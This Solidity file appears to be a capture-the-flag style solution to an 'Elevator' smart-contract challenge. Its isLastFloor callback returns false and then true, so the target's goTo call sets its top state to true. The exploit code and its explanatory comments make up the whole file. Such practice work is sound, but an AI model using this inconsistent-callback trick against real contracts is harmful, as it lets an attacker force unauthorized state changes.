//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Elevator.sol";

contract ElevatorSolution {

    Elevator public elevator;
    uint256 timesCalled;
    constructor(Elevator _elevator) {
        elevator = _elevator;
    }

    // If this contract calles the `goTo` function of the Elevator it is being
    // assigned as a Building contract instance as it is the msg.sender of the call
    // The Elevator makes 2 external calls to this contract via `isLastFloor`

    // during the call to `goTo` make sure the Elevators top state variable
    // is set to true after the call finishes.abi

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (timesCalled == 0) {
            timesCalled++;
            return false;
        }
        return true;
    }

    function attack() external {
        elevator.goTo(1);
    }
}